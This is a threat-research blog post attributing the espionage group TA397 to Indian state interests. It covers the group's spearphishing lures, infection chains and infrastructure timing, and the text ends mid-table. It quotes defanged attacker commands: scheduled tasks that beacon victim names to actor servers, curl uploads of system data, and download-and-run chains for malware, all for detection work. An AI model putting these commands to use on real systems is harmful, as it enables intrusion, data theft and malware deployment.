    "filtered_content": "The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One | Proofpoint US Skip to main content us: English: Americas Select a Language us: English: Americas English: Europe, Middle East, Africa English: Asia Pacific Espa\u00f1ol Deutsch Fran\u00e7ais Italiano Portugu\u00eas \u65e5\u672c\u8a9e \ud55c\uad6d\uc5b4 Search Partners Channel Partners and Distributors MSP Partners Technology and Alliance Partners Support Support Login Sendmail Support Login IP Address Blocked Login Training Proofpoint Cybersecurity Academy Partners Partner Hub Products Digital Risk Portal ET Intelligence Email Fraud Defense Proofpoint Essentials Back Platform Solutions Why Proofpoint Resources Company Get a Demo Contact Us Top Suggestions: Email Security Phishing DLP Email Fraud Prime Threat Protection Platform Collaboration Security Data Security and Governance Platform Technologies Services Platform Cybersecurity for the agentic workspace starts with Proofpoint\u2019s human and agent-centric security platform. Collaboration Security Defend humans and agents against modern cyber threats across email and collaboration channels. Data Security and Governance\u200b Protect the data that powers human and AI collaboration\u200b. Platform Technologies Leverage Proofpoint\u2019s market-leading technologies powering cybersecurity for people, data and AI. Featured Join a live Protect event\u2014learn how to protect people, data, and AI Live Events Collaboration Security Stop cyber threats with AI-driven multichannel protection. Discover Collaboration Security Prime Core Email Protection Activate industry-leading threat protection delivered via API or Gateway. Email Fraud Defense Protect your brand reputation, increase deliverability and identify domain lookalikes. ZenGuide Turn your workforce into your first line of defense with targeted, behavior-changing security awareness training. Secure Email Relay Secure your application email and accelerate DMARC implementation. Account Takeover Protection Detect, investigate, and respond to account takeovers. All Products Featured Experience Core Email Protection in action\u2014block 99.99% of email threats Interactive Demo Data Security and Governance Transform data security with a unified, omnichannel approach. See why Proofpoint is a leader Enterprise DLP Transform DLP with a modern platform that prevents data loss across email, cloud, and endpoints. Adaptive Email DLP Prevent misdirected emails and hidden exfiltration of sensitive data. Insider Threat Management Get visibility into risky behavior by careless, malicious and compromised users. Data Security Posture Management Discover, classify and protect sensitive data across cloud and hybrid environments. Digital Communications Governance Capture, retain and discover digital communications intelligently to ensure compliance. All Products Featured Understand the top data security risks organizations face \u2014 and how to stay ahead Research Report Platform Technologies Proofpoint technologies powering human and agent-centric security\u200b. Discover the security risks Proofpoint Nexus Advanced AI and threat intelligence to detect threats and assess data risk. Proofpoint Zen Integrated control points to protect people and data, wherever work happens. Proofpoint Satori The power behind agentic security operations. Explore Proofpoint packages How to Buy Services Optimize Proofpoint solutions with expert services. Advisory Services Give your team access to expert guidance while they manage daily operations of your Proofpoint platform. Applied Services Gain a hightouch strategic partnership with a team of Proofpoint specialists who optimize your security and monitoring. Featured \"The partnership with Proofpoint, it's an extention of our team.\" \u2013Celesta Capital Customer Story Use Case Industry Use Case Comprehensive solutions for today\u2019s cybersecurity threats. Ensure Acceptable GenAI Use Empower your workforce with safe GenAI practices. Secure Microsoft365 Implement the best security and compliance solution for Microsoft 365. Prevent Loss from Ransomware Stop attacks by securing ransomware's top vector. Combat Email and Cloud Threats Protect your people from email and cloud threats with an intelligent and holistic approach. Protect Cloud Apps Keep your people and their cloud apps secure by eliminating threats and data loss. Change User Behavior Help your employees identify, resist and report attacks before the damage is done. Modernize Compliance and Archiving Manage risk and data retention needs with a modern solution. Authenticate Your Email Protect your email deliverability with DMARC. Featured Learn about new AI risks\u2014and how to build a secure foundation for enterprise adoption White Paper Industry Superior protection for every industry, from small business to large enterprise. Federal Government Enable your agency with cybersecurity built for federal government environments. Higher Education Protect your campus, people, data, and research with advanced security. Healthcare Safeguard your clinicians, patient data, and intellectual property from advanced threats. Internet Service Providers Deliver secure, high-performance email protection for your networks and customers with Cloudmark. State and Local Government Secure your institutions, services, and communities against cyber threats. Financial Services Protect your institution while meeting regulatory and compliance requirements. Mobile Operators Secure your messaging environments and protect subscribers at scale. Small and Medium Businesses Strengthen your business with enterprise-grade security built to grow with you. Featured Discover the security risks healthcare organizations can't afford to ignore Threat Report Why Proofpoint More than 80 of the Fortune 100 choose Proofpoint to protect their people, data, and AI. Why Proofpoint Customer Stories Learn how organizations use Proofpoint to strengthen their cybersecurity, protect their data, and reduce risk. Awards See how our innovation and leadership have been recognized across the industry by leading analysts and publications. Threat Insight Blog Stay up to date on emerging cyber threats with insights from our industry-leading threat research team. Comparing Proofpoint Evaluating cybersecurity vendors? Check out our side-by-side comparison of Proofpoint vs. competitors. Evaluating security vendors? Compare us by checking out side-by-side comparisons. Comparison Overview Proofpoint vs. Abnormal Security Proofpoint vs. Mimecast Proofpoint vs. Check Point Harmony Proofpoint vs. Cisco Proofpoint vs. Symantec Proofpoint vs. Microsoft Purview Proofpoint vs. Legacy DLP Proofpoint vs. SSE Vendors Proofpoint vs. DSPM Vendors Resources Threat Intelligence Resources Research, insights and resources from Proofpoint experts. Resource Library Blog Keep up with the latest news and happenings from our industry leading experts. Cybersecurity Academy Earn your certification to become a Proofpoint Certified Guardian. Events Connect with peers in person and learn from the experts. Webinars Browse our webinar library to learn about the latest threats and issues in cybersecurity. Podcasts Listen to expert conversations and insights on cybersecurity trends, threats and best practices. Customer Stories Read how our customers solve their most pressing cybersecurity challenges Featured New Agents, New Attacks: Securing Collaboration in the Agentic Era Live Webinar Series\u2014Register Now Threat Intelligence Learn from our expert threat intelligence and insights that you won\u2019t find anywhere else. Threat Glossary Learn about the latest security threats and techniques. Podcasts Stay informed with our renowned threat researchers. Power Series Join our virtual event series on the industry's most pressing topics. Threat Insight Blog Gain insight through actionable threat intelligence and expert analysis. Featured Proofpoint DISCARDED Tales from the threat research trenches Podcast Company Learn more about the team driving human and agent-centric security. About Proofpoint Leadership Learn about the executive team leading Proofpoint\u2019s strategy and vision. News Center Read the latest press releases, news stories and media highlights about Proofpoint. AI, Privacy and Trust Learn about how we handle data and make commitments to privacy and other regulations. ESG Learn how we apply our environmental, social, and governance principles to positively impact our community. Careers Stand out and make a difference at one of the world's leading cybersecurity companies. Ready to join a company redefining cybersecurity? Join our Team Blog Threat Insight The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One The Bitter End: Unraveling Eight Years of Espionage Antics\u2014Part One Share with your network! June 04, 2025 Nick Attfield and Konstantin Klinger in collaboration with Threatray\u2019s Abdallah Elshinbary and Jonas Wagner This is a two-part blog series, detailing research undertaken in collaboration with Threatray. Part two of this blog series can be found on their website here . Analyst note: Throughout this blog, researchers have defanged TA397-controlled indicators and modified certain technical details to protect investigation methods. Key findings Proofpoint Threat Research assesses it is highly likely that TA397 is a state-backed threat actor tasked with intelligence gathering in the interests of the Indian state. The group frequently experiments with their delivery methods to load scheduled tasks. However, the resulting scheduled tasks, PHP URL patterns, inclusion of a victim\u2019s computer name and username in the beaconing, and Let\u2019s Encrypt certificates on attacker servers provide a high confidence fingerprint of detecting the group\u2019s activity. TA397 will frequently target organizations and entities in Europe that have interests or a presence in China, Pakistan, and other neighboring countries on the Indian subcontinent. TA397\u2019s hands-on-keyboard and infrastructure operations align with the standard working hours of the Indian Standard Time (IST) timezone. Overview TA397 (Bitter) is an espionage group with a long history of targeting South Asian entities. While the group is frequently attributed to India (non-publicly), the reasoning behind this is not clearly documented. In this blog we share evidence showing TA397 to be an India-aligned threat actor and release previously undisclosed evidence of the group\u2019s targeting outside of Asia. In part one of this blog series, we explore TA397\u2019s campaigns, targeting, and payload delivery and conduct an in-depth analysis of TA397\u2019s infrastructure. Part two of this blog series expands on this research with a deep dive into TA397\u2019s entire observed malware arsenal, highlighting how the group\u2019s capabilities support its espionage operations. Our joint research with the Threatray research team aims to substantiate the claim that TA397 is an espionage-focused, state-backed threat actor, tasked with intelligence gathering in the interests of the Indian state. TA397\u2019s Operations This section covers some of the campaigns observed by Proofpoint Threat Research from October 2024 to April 2025 that we have attributed to TA397. Campaigns referenced throughout part one of this blog fall within this timeframe. This section covers the group\u2019s targeting, the types of email accounts used to deliver phishing emails, the subjects employed to blend with legitimate traffic, the lures crafted to entice targets to engage with attachments or links, and finally TA397\u2019s infection chains that used to deploy malicious payloads on targets of interest. Proofpoint Threat Research also has unique insight into what hands-on-keyboard activity looks like from the group. The data presented in this blog provides a new lens from which to analyze victimology and highlights the fact that the group has a much wider pool of collection targets than previously documented. Campaigns, victimology, and lures Tracking and analyzing TA397\u2019s activity over an extended period surfaces several observable behavioral patterns displayed by the group. These patterns provide threat researchers with many opportunities to monitor and detect TA397\u2019s activity. Proofpoint has observed TA397 frequently targeting an exceedingly small subset of targets. Geographically, this targeting is also almost exclusively observed against European entities with links to China or India\u2019s neighbors, with some targeting also observed in China and South America. While this is likely more indicative of visibility bias, most public reporting on the group details TA397\u2019s activities against organizations in Asia. The TA397 targeting verticals we have observed are also highly characteristic of espionage-focused threat actors. Governments, diplomatic entities, and defense organizations are frequently targeted to enable intelligence collection on foreign policy or current affairs, in addition to providing threat actors potential insight into a government\u2019s position or decision-making process on political issues, trade negotiations, defense contracts, or wider economic investments. When analyzing targeting and attributing clusters of threat activity, the topics and themes will almost certainly map onto the geopolitical, economic, or military interests of the threat actor\u2019s suspected country of origin. The targets, subjects, and lures of TA397\u2019s campaigns exhibit these same qualities, which are consistent with activity that is in the intelligence interests of the Indian state. TA397 uses a swathe of different email accounts to carry out its operations. The group has shifted between freemail providers \u2013 163[.]com, 126[.]com, and ProtonMail \u2013 and various compromised accounts belonging to the governments of Pakistan, Bangladesh, and Madagascar. Within these campaigns, TA397 has been seen masquerading or spoofing various entities within the Chinese government, the Embassy of Mauritius in China, the Embassy of Madagascar in China, the Ministry of Foreign Affairs of the Republic of Korea, and the Foreign Affairs Office in Beijing to name a few. The subject lines employed alongside TA397\u2019s sender accounts provide insight into topics, themes, and events specific to either the group\u2019s or the targets\u2019 interests. Some of the subjects that Proofpoint has observed in TA397\u2019s campaigns are shown below: AUTHORIZATION TO RENEW CONTRACTS OF ECD AGENTS AT THE LEVEL OF EXTERNAL REPRESENTATIONS PUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR SituationNote : SouthKorea_Martial law Seoul Embassy Advisory Invitation Embassy of the Islamic Republic of Pakistan Beijing Dec 2024. EU Delegation Key National Defense R&D Projects Note from Embassy of Mauritius 13 December 2024 Fw:Fw:CN_5896_File_vers1 Fw: A/c Records : Beijing Fw: Preferential Visa Rules Updates 2025 Protocol Guidelines for Diplomatic Missions Department of Northeast Asia, Ministry of Foreign Affairs Invitation Armed Forces Day Re: Intermediate structure WA's Ministry of Commerce File Espionage-focused threat actors frequently operate in the realm of politics, diplomacy, trade, investment, and defense. Based on Proofpoint\u2019s visibility of the group\u2019s activity, TA397 is no different. As shown above, there are some subjects purportedly discussing matters relevant to European organizations involved in diplomacy. There are also many subject lines pertaining to diplomatic or military issues in China, Pakistan, and Northeast Asia. One campaign aligned with the timing of the crisis in December 2024 when South Korea\u2019s president instituted martial law where the subject \u2013 \u201cSituationNote : SouthKorea_Martial law Seoul Embassy Advisory\u201d \u2013 clearly demonstrates how threat actors attempt to blend in with legitimate email traffic by leveraging topical themes and content the target is likely to read or see in their inbox. There are two campaigns that are particularly interesting given TA397\u2019s suspected attribution. The campaigns with the subjects \u201cPUBLIC INVESTMENTS PROJECTS 2025 _ MADAGASCAR\u201d and \u201cNote from Embassy of Mauritius 13 December 2024\u201d both show TA397 attempting to appear as if the emails were legitimately from the Malagasy and Mauritian embassies respectively (despite using a Chinese freemail address in the campaign where the sender claimed to be the Mauritian embassy in China). Example TA397 lure email containing a RAR-enclosed CHM attachment. This targeting may reflect that both Madagascar and Mauritius are strategic partners of India, with relationships spanning across trade, energy, infrastructure, and more. Furthermore, as of early 2024 into 2025, India has engaged in \u201cjoint naval exercises, coordinated patrols, information sharing, HADR efforts, capacity building and other diplomatic engagements\u201d with both Madagascar and Mauritius on multiple occasions . Based on the content and the decoy documents employed, it is clear that TA397 has no qualms with masquerading as other countries\u2019 governments, including Indian allies. While TA397\u2019s targets in these campaigns were Turkish and Chinese entities with a presence in Europe, it signals that the group likely has knowledge and visibility into the legitimate affairs of Madagascar and Mauritius and uses the material in spearphishing operations. Many espionage-focused threat actors often send decoy documents or accompanying files alongside initial access payloads, or links to mislead targets and convince them of the legitimacy of the email. Over the last year however, Proofpoint has only observed TA397 doing this in two instances, in a previously published campaign targeting an organization in the Turkish defense sector, and a campaign targeting European entities located in China. False document lure to add legitimacy to phishing email containing a malicious attachment. The rest of the campaigns TA397 has carried out simply contained plain-text body messages where the group masqueraded as a legitimate government organization, with an accompanying malicious attachment or URL. This choice demonstrates an overall lack of maturity in the group\u2019s phishing operations compared to many other state-backed threat actors. Infection chain TA397 may not display advanced capabilities, but the group is highly active, carrying out frequent and consistent campaigns. While the group has a \u201ctried and true\u201d methodology that it always seem to fall back on, TA397 has also demonstrated an ability to experiment with novel infection chains to bypass detections or exploit vulnerabilities. Initial access Spearphishing emails remain TA397\u2019s preferred technique for initial access, and to date, we are not aware of any reports indicating the use of alternative methods by this group. That said, the group\u2019s spearphishing tactics have evolved and demonstrate a degree of flexibility. While in 2019/2020, TA397 relied on exploiting CVEs , used ArtraDownloader to deploy additional payloads, and even experimented with Android malware , the group has consistently shown a preference for scheduled tasks in recent years, as reported by Proofpoint , Ahnlab , StrikeReady Labs , Cisco Talos , and others. In historical operations, ArtraDownloader encoded both the username and the computer name of the infected machine within the HTTP(S) POST C2 beacon . This data was sent to the C2 server on a regular basis, presumably allowing the actor to manually assess whether the victim met certain targeting criteria, and if so, deliver a second-stage payload. TA397 continues to follow the same approach today using scheduled tasks (detailed below). The emails in the campaigns we observed typically contained either a direct attachment or a URL that leveraged a legitimate file-sharing service to deliver a file, which then launched a scheduled task. Even when a file was directly attached to the email, it ultimately resulted in the creation of a scheduled task. In some cases, the file was packaged within an archive before execution as the actors experimented with more advanced techniques. For example, in late 2024 shortly after the usage of alternate data streams in NTFS file systems , Proofpoint observed TA397 using an esoteric file type: Microsoft Search Connector (MSC) files , which allow users to connect with data stored in web services or remote storage locations. This was a new tactic for the group to drop and launch LNK files to the infected machine and create scheduled tasks. We cover this chain in more detail below, including the follow-on hands-on-keyboard activity. These search connectors are Microsoft XML files and are abused in a similar way to library files or saved search files. Abusing WebDAV for payload downloads has become a trend with various groups in the threat landscape over the past years. This specific search connecter technique was reported to be a security risk in 2023 , but first observed use by TA397 was in late 2024. Another esoteric file type was observed in a TA397 campaign in late 2024. The emails contained a RAR archive with an MSC file inside. If double clicked and run by the user, the MSC started mmc.exe, which set up a scheduled task that attempts to use PowerShell to download and run the next stage payload. In this campaign, TA397 exploited CVE-2024-43572, otherwise known as GrimResource , which is a vulnerability that provides attackers remote code execution in the context of mmc.exe on targeted endpoints. This vulnerability was first publicly reported in June 2024, and Threat Research first observed TA397 using this file type in October 2024. Over a period of years, TA397 has experimented with various methods for dropping or creating a scheduled task. However, the scheduled task itself remains largely unchanged, which we will highlight in the next section. Among the file types used to initiate scheduled tasks via cmd.exe or PowerShell are MSC, LNK, CHM, MS Access, IQY files, and others. Since Proofpoint began tracking TA397 in 2021, we have not observed the group using zero-day vulnerabilities or techniques that haven\u2019t already been publicly disclosed or reported. The group likely also monitors the threat landscape and follows a \u201ctried and true\u201d approach with initial access payloads, using whatever proves effective. The group maintains consistency in the scheduled task method but tends to vary when it comes to the final payload (see later chapters). The graphic below provides a general overview of the initial access infection chains observed: Overview of TA397\u2019s infection chains. Scheduled tasks The following example of a scheduled task command line shows how the task beaconed every 16 minutes to the staging domain woodstocktutors[.]com, awaiting instructions to retrieve the next-stage payload. When these samples were executed in a sandbox environment, no additional payloads were delivered. However, when allowed to run for a longer period, a next-stage payload was eventually dropped. This behavior appeared to be manual, likely triggered by the actor after evaluating certain selection criteria \u2013 such as the victim\u2019s IP address, computer name, and username, which were sent to the server via the beacon. \"C:\\\\Windows\\\\System32\\\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"EdgeTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"woodstocktutors[.]com/jbc.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\\\Users\\\\public\\\\kwe.cc\"; Get-Content \"C:\\\\Users\\\\public\\\\kwe.cc\" | cmd\" The group experimented with various PowerShell and command-line tools (e.g. curl, conhost, etc.) and obfuscation methods, but the core functionality remained consistent. Below is another example featuring an obfuscated PowerShell command that created a scheduled task beaconing every 18 minutes to princecleanit[.]com: schtasks /create /tn \\\\\"Task-S-1-5-42121\\\\\" /f /sc minute /mo 18 /tr \\\\\"conhost --headless cmd /v:on /c set gz=ht& set gtz=tps:& set 7gg=!gz!!gtz!& set 6hg=!7gg!//p^rin^ce^cle^anit.co^m& c^ur^l !6hg!/d^prin.p^hp?dr=%computername%;%username%|c^m^d\\\\\" As part of our ongoing tracking of the group, Proofpoint Threat Research identified a signature for TA397 when creating scheduled tasks. The way the group structured PHP URI requests to staging infrastructure with a combination of computer name and username, with varying characters between, may have been an effort to throw off static detections. This has been consistent for years, as shown by the examples below observed in historical TA397 campaigns. blucollinsoutien[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME hxxp://46.229.55[.]63/svch.php?li=%computername%..%username% hxxp://95.169.180[.]122/vbgf.php?mo=%computername%--%username% hxxp://inizdesignstudio[.]com/lk.php?xm=$env:computername*$env:username hxxp://trkswqsservice[.]com/turf.php?xm=$env:COMPUTERNAME*$env:USERNAME hxxp://woodstocktutors[.]com/jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME hxxps://princecleanit[.]com/dprin.php?dr=%computername%;%username% hxxps://utizviewstation[.]com/dows.php?cb=$env:COMPUTERNAME*$env:USERNAME hxxps://www[.]headntale[.]com/lchr.php?ach=%computername:~0,15%_%username:~0,5% hxxps://www.mnemautoregsvc[.]com/GIZMO/flkr.php?sa=COMPUTERNAME**USERNAME jacknwoods[.]com/jacds.php?jin=%computername%_%username% utizviewstation[.]com/sdf.php?fv=$env:COMPUTERNAME*$env:USERNAME warsanservices[.]com/mydown.php?dnc=%username%_%computername% warsanservices[.]com/myupload.php?dnc=%username%_%computername% Inspection of the TLS certificates used by these staging domains revealed that most of them relied on standard Let\u2019s Encrypt certificates. We performed a timestamp analysis on these certificates, as detailed in the infrastructure analysis section. Here is an example for the princecleanit[.]com staging domain: princecleanit[.]com TLS certificate from Censys . Typical characteristics: Subject DN: CN=*.<domain> Issuer DN: C=US, O=Let\u2019s Encrypt, CN=R[0-9]+ Validity Period: 90 days These present detection opportunities for the initial access techniques of this actor: the consistent use of scheduled tasks, the specific PHP URL pattern, the inclusion of the victim\u2019s computer name and username in the beacon, and the presence of a Let\u2019s Encrypt certificate on the server side. Collectively these form a high confidence fingerprint and strongly suggest the activity is attributable to TA397. Fingerprint of TA397\u2019s scheduled tasks and infrastructure. Hands-on-keyboard activity During our research, we observed TA397 engaging in hands-on-keyboard activity. Specifically, the group dropped a RAT, followed shortly by a second one. It is highly likely this was direct manual activity by the actor during a traditional work schedule in India. As covered in Proofpoint\u2019s previous blog on TA397, where we detailed the manual deployment of wmRAT and MiyaRAT, we have since observed TA397 engaging in hands-on-keyboard activity in two distinct campaigns targeting government organizations. The first case was the previously highlighted campaign using the search connecter file format, in which the group used this novel technique to drop an LNK file that would load a scheduled task on a target machine. \"C:\\\\Windows\\\\System32\\\\cmd.exe\" /start min /c schtasks /create /tn \"OneDrive\\\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379\" /f /sc minute /mo 19 /tr \"conhost --headless cmd /v:on /c set 765=ht& set 665=tp:& set 565=!765!!665!& set 465=!565!//46.229.55[.]63& curl !465!/sv^c^h.p^h^p?li=%computername%..%hostname%c^m^d\"& msg * \"ERROR 0XA008CE : ERROR reading File, contents are corrupted.\" This LNK file used cmd.exe to set up a scheduled task named \u201cOneDrive\\\\OneDrive Standalone Update Task-S-1-5-21-9920643986-2299988379,\" which attempted to use conhost.exe to download and run the next stage payload every 19 minutes. To do so, the scheduled task created a curl request to hxxp://46.229.55[.]63/svch[.]php?li=%computername%..%username% providing details of the affected target machine. It also displayed a decoy error message to the user saying that the original file cannot be viewed. This scheduled task was left beaconing for 18 hours until Proofpoint first observed a response from TA397 at 05:27 UTC (10:57 IST): HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 05:27:59 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 330 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata dir > abc1.pdf tasklist >> abc1.pdf wmic /namespace:\\\\\\\\root\\\\SecurityCenter2 path AntiVirusProduct get >>abc1.pdf wmic logicaldisk get caption >> abc1.pdf systeminfo >> C:\\\\programdata\\\\abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf This enumeration was essentially identical to the one that Proofpoint detailed in our previous blogpost on TA397 , with the addition of the systeminfo command. In the request, the actor issued a POST request with this target machine information to a different PHP endpoint on the staging domain: /svupfl[.]php?oi=%computername%_%username%. Eighteen minutes later, we observed this request: HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 05:46:59 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 381 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata set /P =\"MZ\" < nul >> sh1.txt\" curl -o sh2.txt <hxxp://173.254.204[.]72/sh2.txt> copy /b sh1.txt+sh2.txt shh.exe curl -o dune64.log <http://173.254.204[.]72/dune64.log> ren dune64.log dune64.bin shh.exe dune64.bin dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf In this case, TA397 operators made an error by issuing a curl command that attempted to retrieve a payload from: hxxp://173.254.204[.]72/dune64.log However, this request returned a 404 error as the attackers had not placed a file with that name on their server \u2013 making the rename command and the execution of shh.exe fail. Instead, it turned out that the next stage was present under /dune64.bin. When Proofpoint analysts executed the shh.exe payload alongside the dune64.bin binary, the full chain executed correctly. Analysis of these payloads allowed us to identify shh.exe as KugelBlitz and dune64.bin as the Demon agent from the Havoc C2 framework. This variant was found to be communicating with 72.18.215[.]108 over port 443. After the actor\u2019s initial attempt to load the backdoor failed, we observed another request at 08:57 UTC (14:27 IST): HTTP/1.1 200 OK Date: Thu, 05 Dec 2024 08:57:00 GMT Server: Apache/2.4.62 (Ubuntu) Content-Length: 263 Content-Type: image/jpeg Cache-Control: no-cache cd C:\\\\programdata net use Z: \\\\\\\\72.18.215[.]1\\\\tempy Z: Z:\\\\shl.exe dune64.bin C: net use /delete Z: /y whoami dir > abc1.pdf tasklist >> abc1.pdf curl -X POST -F \"file=@C:\\\\programdata\\\\abc1.pdf\" <hxxp://46.229.55[.]63/svupfl.php?oi=%computername%_%username%> del abc1.pdf In this case, TA397 attempted to execute the same chain as three hours prior, this time opting to pull the full payloads from a separate actor-controlled server, by mounting an SMB share called tempy. By enumerating this share, Proofpoint was able to identify that TA397 was also storing wmRAT and MiyaRAT payloads on the drive, the exact same binaries we blogged about in December 2024 . Furthermore, within TA397\u2019s drive, Proofpoint found two documents that may have been exfiltrated from victims. The first document was a scanned copy of an official government tax document from Bangladesh. We have redacted this information from the blog for anonymity and safety purposes. The second, was a strategic military document and appeared to originate from a military organization of Bangladesh. For these reasons, we have elected to omit it from this publication. These documents both appeared to be photocopies or scans of handwritten documents. Both documents are likely legitimate, and it is highly likely they were exfiltrated from TA397 victims. This targeting is consistent with TA397\u2019s historical activity and reinforces that both organizations are regular collection targets for TA397\u2019s espionage activities. The second case of hands-on-keyboard activity Proofpoint observed was in a more common infection chain for the group using CHM files. The email appeared to be a thread with another recipient to make the attachment appear more legitimate. The email contained a RAR compressed CHM file. If double-clicked and run by the user, the CHM set up a MSTaskUI scheduled task that attempted to use PowerShell through conhost.exe to download and run the next stage payload every 16 minutes with the curl utility. \"C:\\\\Windows\\\\System32\\\\conhost.exe\" --headless cmd /c ping localhost > nul & schtasks /create /tn \"MSTaskUI\" /f /sc minute /mo 16 /tr \"conhost --headless powershell -WindowStyle Minimized irm \"utizviewstation[.]com/sdf.php? fv=$env:COMPUTERNAME*$env:USERNAME\" -OutFile \"C:\\\\Users\\\\public\\\\documents\\\\vfc.cc\"; Get-Content \"C:\\\\Users\\\\public\\\\documents\\\\vfc.cc\" | cmd\" Proofpoint observed TA397 operators respond to these ongoing scheduled task requests with manual commands at 10:40 UTC (16:20 IST), issuing a command that enumerated the target machine and sent a POST request containing that information. tree \"%userprofile%\\\\Desktop\" /f > C:\\\\Users\\\\Public\\\\Documents\\\\d.log systeminfo >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log WMIC /Node:localhost /Namespace:\\\\\\\\root\\\\SecurityCenter2 Path AntiVirusProduct Get displayName,productState /Format:List >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log wmic logicaldisk get name >> C:\\\\Users\\\\Public\\\\Documents\\\\d.log cd C:\\\\Users\\\\Public\\\\Documents curl -X POST -F \"file=@d.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%computername% del d.log Similar to previously observed hands-on-keyboard activity seen from the group, the POST request containing the infected machine\u2019s information was directed to the same staging domain, but a different PHP URI /urf.php?mn=%computername% than the scheduled task. Proofpoint has observed TA397 refraining from dropping next-stage payloads depending on the system information provided on the infected machine. It is likely that the computer name and information sent to the staging domain within the scheduled tasks undergo some form of pre-filtering. This selection criterion is similar to what was reported regarding the earlier use of ArtraDownloader . This is also likely why the actors remained consistent in their use of scheduled tasks, while varying their initial access methods and final payloads. Their selection criteria is a crucial part of their overall process and indicative of the highly targeted nature of espionage. At 13:37 UTC (19:07 IST) we observed this response from the attacker server: curl -o C:\\\\ProgramData\\\\msuitl.tar hxxp://utizviewstation[.]com/msuitl.tar cd C:\\\\ProgramData tar -xvf msuitl.tar dir > t0.log msuitl.exe tasklist >> t0.log curl -X POST -F \"file=@t0.log\" hxxps://www.utizviewstation[.]com/urf.php?mn=%username% del t0.log This issued a request to the /msuitl.tar endpoint on the domain, dropping the final payload: HTTP/1.1 200 OK Connection: Keep-Alive Keep-Alive: timeout=5, max=100 content-type: application/x-tar last-modified: Mon, 03 Feb 2025 11:23:10 GMT accept-ranges: bytes content-length: 45568 date: Mon, 03 Feb 2025 13:37:21 GMT server: LiteSpeed Cache-Control: no-cache msuitl.exe As seen from the response headers, the endpoint was modified 43 minutes after the initial enumeration of the infected machine, suggesting TA397 made a conscious decision to load a hand-picked payload to the staging infrastructure. It is likely this payload selection is directly correlated to target selection and information gleaned from initial enumeration.The final payload of this campaign turned out to be BDarkRAT, which can be found in part two of this post on Threatray\u2019s blog . While TA397\u2019s initial access vector has consistently been spearphishing emails and the first part(s) of the group\u2019s intrusion chains have varied between a handful of techniques, the breadth of malware payloads the group has been observed deploying is significant. The following image plots the timestamps of our observed hands-on-keyboards activity over a Monday to Friday working hours schedule in Indian Standard Timezone (IST): Heatmap of observed hands-on-keyboard activity timestamps. Infrastructure analysis Timezone analysis has proven to be a successful method for attributing espionage groups \u2014not only for Asian espionage groups , but also specifically for TA397, as demonstrated by Bitdefender in 2020 , and during our observations of hands-on-keyboard activity. In the Bitdefender research, analysis of the creation timestamps of code-signing certificates used in TA397 malware, as well as ZIP file timestamps for samples, revealed that they mapped to Indian Standard Time (UTC +5:30) and followed a 9-to-5, Monday-to-Friday working schedule. For this research, we collected 122 known TA397 C2 and staging domains from internal telemetry, pivoting, and public reports, spanning several years since the group was first publicly reported. For each domain (when available), we gathered the following three timestamps: and public reports, spanning several years since the group was first publicly reported. For each domain (when available), we gathered the following three timestamps: Passive DNS first seen timestamp; Domain creation timestamp from WHOIS data; TLS certificate creation timestamp from Let\u2019s Encrypt certificate. Example data: Domain Campaign Date Passive DNS WHOIS Certificate Staging URL blucollinsoutien[.]com 2025-04-01 2025-03-11 13:09:43 IST 2025-03-11 13:06:44 IST 2025-03-11 13:08:45 IST /jbc.php?fv=$env:COMPUTERNAME*$env:USERNAME princecleanit[.]com 2025-03-26 2025-01-03 14:16:21 IST 2025-01-02 15:27:04 IST 2025-01-02 15:30:00 IST /dprin.php?dr=COMPUTERNAME;USERNAME After converting all timestamps to Indian Standard Time (IST), we generated three separate heatmaps\u2014one for each data source. For better visualization, the standard \u201cworking hours\u201d are marked with dotted lines. The data largely aligns with this pattern or at least suggests a clear trend. Passive DNS: Heatmap of Passive DNS first seen timestamps. Since there can be a delay between domain registration and the first seen timestamp recorded in passive DNS databases for a variety of reasons, the presence of outliers is not unexpected. WHOIS: Heatmap of WHOIS domain registration timestamps. WHOIS data provides information about domain registrations. For this research, we queried the WHOIS database directly. Since we are working with historical data, the domain creation date was not always available for every domain included in the study (e.g. removed from the database following domain expiry). The data shows that \u201clunch hour\u201d on Friday stands out, as the actor registered multiple domains within minutes of each other on the same day. Logically, this suggests that a member of the infrastructure team likely registered several domains in a single \u201csession\u201d rather than just one at a time. Certificate: Heatmap of Let\u2019s Encrypt certificate valid from timestamps. For this research, we used Censys to locate the TLS certificates associated with each domain and queried the certificate creation timestamp. We only included data points where a Let\u2019s Encrypt certificate was used, as this has previously been identified as an indicator of this group\u2019s infrastructure. One of the challenges we faced was that some of the historical C2 and staging domains were no longer active \u2013 either expired or re-registered \u2013 so selecting the correct Let\u2019s Encrypt certificate was critical to ensure accurate analysis. Some registrars and providers offer services that automatically renew expired certificates or issue a TLS certificate upon domain registration. The domains analyzed in this research span a variety of hosting providers. Combining all data sources into a single heatmap yields the following result: Combined heatmap of Passive DNS, WHOIS and certificate timestamps. There is a visible variation between domain creation and TLS certificate issuance. Below are two example data points \u2013 one for a C2 domain and one for a staging domain \u2013 where the domain was registered several days before the corresponding TLS certificate was issued. The associated campaign activity began several days after that. All timestamps align with India Standard Time, and there is a clear indication that most infrastructure-related activity occurs during standard business hours in that timezone. Domain Passive DNS WHOIS Certificate Source / 